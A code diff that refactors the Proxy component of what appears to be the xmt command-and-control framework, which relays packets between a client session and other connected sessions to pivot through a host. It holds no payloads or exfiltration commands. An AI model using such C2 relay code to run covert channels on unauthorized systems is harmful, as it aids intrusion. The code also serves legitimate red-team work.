@@ -10,17 +10,19 @@ import (
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/device"
+	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
-// Proxy is a struct that controls a Proxied connection between a client and a server and allows for packets to be
-// routed through a current established Session.
+// Proxy is a struct that controls a Proxied connection between a client and a
+// server and allows for packets to be routed through a current established
+// Session.
 type Proxy struct {
 	listener net.Listener
 	connection
 
 	clients map[uint32]*proxyClient
-	ch      chan waker
+	ch      chan struct{}
 	close   chan uint32
 	parent  *Session
 	cancel  context.CancelFunc
@@ -30,7 +32,7 @@ type Proxy struct {
 }
 type proxyClient struct {
 	send, chn chan *com.Packet
-	wake      chan waker
+	wake      chan struct{}
 	peek      *com.Packet
 	ID        device.ID
 	state     state
@@ -51,7 +53,7 @@ func (p *Proxy) prune() {
 			p.lock.RLock()
 			if _, ok := p.clients[i]; ok {
 				if delete(p.clients, i); cout.Enabled {
-					p.log.Debug("[%s/Proxy] Removed closed Session 0x%X.", p.parent.ID, i)
+					p.log.Info("[%s/Proxy] Removed closed Session 0x%X.", p.parent.ID, i)
 				}
 			}
 			p.lock.RUnlock()
@@ -117,8 +119,9 @@ func (p *Proxy) clientLock() {
 	p.lock.RLock()
 }
 
-// Close stops the operation of the Proxy and any Sessions that may be connected. Resources used with this
-// Proxy will be freed up for reuse.
+// Close stops the operation of the Proxy and any Sessions that may be connected.
+//
+// Resources used with this Proxy will be freed up for reuse.
 func (p *Proxy) Close() error {
 	if p.state.Closed() {
 		return nil
@@ -167,9 +170,6 @@ func (p *Proxy) tags() []uint32 {
 	p.lock.RUnlock()
 	return t
 }
-func (p *Proxy) prefix() string {
-	return p.parent.ID.String() + "/P"
-}
 func (c *proxyClient) chanWake() {
 	if c.state.WakeClosed() || len(c.wake) >= cap(c.wake) {
 		return
@@ -180,7 +180,8 @@ func (c *proxyClient) chanWake() {
 	}
 }
 
-// Address returns the string representation of the address the Listener is bound to.
+// Address returns the string representation of the address the Listener is
+// bound to.
 func (p *Proxy) Address() string {
 	return p.listener.Addr().String()
 }
@@ -190,6 +191,7 @@ func (p *Proxy) wrapper() Wrapper {
 func (c *proxyClient) name() string {
 	return c.ID.String()
 }
+func (proxyClient) accept(_ uint16) {}
 func (c *proxyClient) chanWakeClear() {
 	if c.state.WakeClosed() {
 		return
@@ -218,6 +220,14 @@ func (c *proxyClient) chanStart() bool {
 func (c *proxyClient) update(_ string) {
 	c.state.Set(stateSeen)
 }
+
+// Done returns a channel that's closed when this Proxy is closed.
+//
+// This can be used to monitor a Proxy's status using a select statement.
+func (p *Proxy) Done() <-chan struct{} {
+	return p.ch
+}
+func (proxyClient) frag(_, _, _ uint16) {}
 func (c *proxyClient) chanRunning() bool {
 	return c.state.Channel()
 }
@@ -247,9 +257,10 @@ func (c *proxyClient) queue(n *com.Packet) {
 	if c.state.SendClosed() {
 		return
 	}
-	if n.Device.Empty() {
-		panic("proxy found empty ID" + n.String())
-		//n.Device = s.ID
+	if bugtrack.Enabled {
+		if n.Device.Empty() {
+			bugtrack.Track("c2.proxyClient.queue(): Calling queue with empty Device, n.ID=%d!", n.ID)
+		}
 	}
 	if c.chn != nil {
 		select {
@@ -265,6 +276,12 @@ func (c *proxyClient) queue(n *com.Packet) {
 }
 func (c *proxyClient) clientID() device.ID {
 	return c.ID
+}
+func (proxyClient) deadlineRead() time.Time {
+	return empty
+}
+func (proxyClient) deadlineWrite() time.Time {
+	return empty
 }
 func (c *proxyClient) pick(i bool) *com.Packet {
 	if c.peek != nil {
@@ -294,7 +311,7 @@ func (c *proxyClient) next(i bool) *com.Packet {
 		c.state.Unset(stateReady)
 		return nil
 	}
-	if len(c.send) == 0 && n.Verify(c.ID) {
+	if len(c.send) == 0 && verifyPacket(n, c.ID) {
 		if isPacketNoP(n) {
 			c.state.Set(stateReady)
 		} else {
@@ -302,21 +319,61 @@ func (c *proxyClient) next(i bool) *com.Packet {
 		}
 		return n
 	}
-	if n, c.peek = nextPacket(wake, c.send, n, c.ID, n.Tags); isPacketNoP(n) {
+	if n, c.peek = nextPacket(c, c.send, n, c.ID, n.Tags); isPacketNoP(n) {
 		c.state.Set(stateReady)
 	} else {
 		c.state.Unset(stateReady)
 	}
 	return n
 }
-func (c *proxyClient) deadlineRead() time.Time {
-	return empty
-}
-func (c *proxyClient) deadlineWrite() time.Time {
-	return empty
-}
 func (c *proxyClient) sender() chan *com.Packet {
 	return c.send
+}
+
+// Proxy establishes a new listening Proxy connection using the supplied Profile
+// that will send any received Packets "upstream" via the current Session.
+//
+// Packets destined for hosts connected to this proxy will be routed back and
+// forth on this Session.
+//
+// This function will return an error if this is not a client Session or
+// listening fails.
+func (s *Session) Proxy(p Profile) (*Proxy, error) {
+	if s.parent != nil {
+		return nil, xerr.Sub("must be a client session", 0x5)
+	}
+	// TODO(dij): Eventually this will be removed :P
+	if s.proxy != nil {
+		return nil, xerr.Sub("only a single Proxy per session can be active", 0x2)
+	}
+	if p == nil {
+		return nil, ErrInvalidProfile
+	}
+	h, w, t := p.Next()
+	if len(h) == 0 {
+		return nil, ErrNoHost
+	}
+	l, err := p.Listen(s.ctx, h)
+	if err != nil {
+		return nil, xerr.Wrap("unable to listen", err)
+	}
+	if l == nil {
+		return nil, xerr.Sub("unable to listen", 0x8)
+	}
+	v := &Proxy{
+		ch:         make(chan struct{}, 1),
+		close:      make(chan uint32, 8),
+		parent:     s,
+		clients:    make(map[uint32]*proxyClient),
+		listener:   l,
+		connection: connection{s: s.s, p: p, w: w, m: s.m, t: t, log: s.log},
+	}
+	if v.ctx, v.cancel = context.WithCancel(s.ctx); cout.Enabled {
+		s.log.Info("[%s/P] Added Proxy Listener on %q!", s.ID, h)
+	}
+	s.proxy = v
+	go v.listen()
+	return v, nil
 }
 func (p *Proxy) clientGet(i uint32) (connHost, bool) {
 	v, ok := p.clients[i]
@@ -349,8 +406,7 @@ func (p *Proxy) talk(a string, n *com.Packet) (*conn, error) {
 	if n.Device.Empty() || p.parent.state.Closing() {
 		return nil, io.ErrShortBuffer
 	}
-	n.Flags |= com.FlagProxy
-	if cout.Enabled {
+	if n.Flags |= com.FlagProxy; cout.Enabled {
 		p.log.Debug("[%s/P:%s] %s: Received a Packet %q..", p.parent.ID, n.Device, a, n)
 	}
 	p.lock.RLock()
@@ -374,7 +430,7 @@ func (p *Proxy) talk(a string, n *com.Packet) (*conn, error) {
 		c = &proxyClient{
 			ID:    n.Device,
 			send:  make(chan *com.Packet, cap(p.parent.send)),
-			wake:  make(chan waker, 1),
+			wake:  make(chan struct{}, 1),
 			state: state(stateReady),
 		}
 		p.lock.Lock()
@@ -400,51 +456,6 @@ func (p *Proxy) talk(a string, n *com.Packet) (*conn, error) {
 	if err = v.process(p.log, p, a, n, false); err != nil {
 		return nil, err
 	}
-	return v, nil
-}
-
-// Proxy establishes a new listening Proxy connection using the supplied listener that will send any received
-// Packets "upstream" via the current Session. Packets destined for hosts connected to this proxy will be routed
-// back and forth on this Session. This function will return a wrapped 'ErrUnable' if this is not a client Session.
-func (s *Session) Proxy(b string, c Accepter, p Profile) (*Proxy, error) {
-	if s.parent != nil {
-		return nil, xerr.New("must be a client session")
-	}
-	// TODO: Eventually this will be removed :P
-	if s.proxy != nil {
-		return nil, xerr.New("only a single Proxy per session can be active")
-	}
-	if c == nil && p != nil {
-		if v, ok := p.(hinter); ok {
-			c = v.Listener()
-		}
-	}
-	if c == nil {
-		return nil, ErrNoConnector
-	}
-	h, err := c.Listen(b)
-	if err != nil {
-		return nil, xerr.Wrap("unable to listen on "+b, err)
-	}
-	if h == nil {
-		return nil, xerr.New("unable to listen on " + b)
-	}
-	v := &Proxy{
-		ch:         make(chan waker, 1),
-		close:      make(chan uint32, 8),
-		parent:     s,
-		clients:    make(map[uint32]*proxyClient),
-		listener:   h,
-		connection: connection{s: s.s, log: s.log, w: s.w, t: s.t},
-	}
-	if p != nil {
-		v.w, v.t = p.Wrapper(), p.Transform()
-	}
-	if v.ctx, v.cancel = context.WithCancel(s.ctx); cout.Enabled {
-		s.log.Info("[%s] Added Proxy Listener on %q!", s.ID, b)
-	}
-	s.proxy = v
-	go v.listen()
 	return v, nil
 }
 func (p *Proxy) resolve(s *proxyClient, a string, t []uint32) (*conn, error) {
@@ -486,7 +497,7 @@ func (p *Proxy) talkSub(a string, n *com.Packet, o bool) (connHost, uint32, *com
 		c = &proxyClient{
 			ID:    n.Device,
 			send:  make(chan *com.Packet, cap(p.parent.send)),
-			wake:  make(chan waker, 1),
+			wake:  make(chan struct{}, 1),
 			state: state(stateReady),
 		}
 		p.lock.Lock()
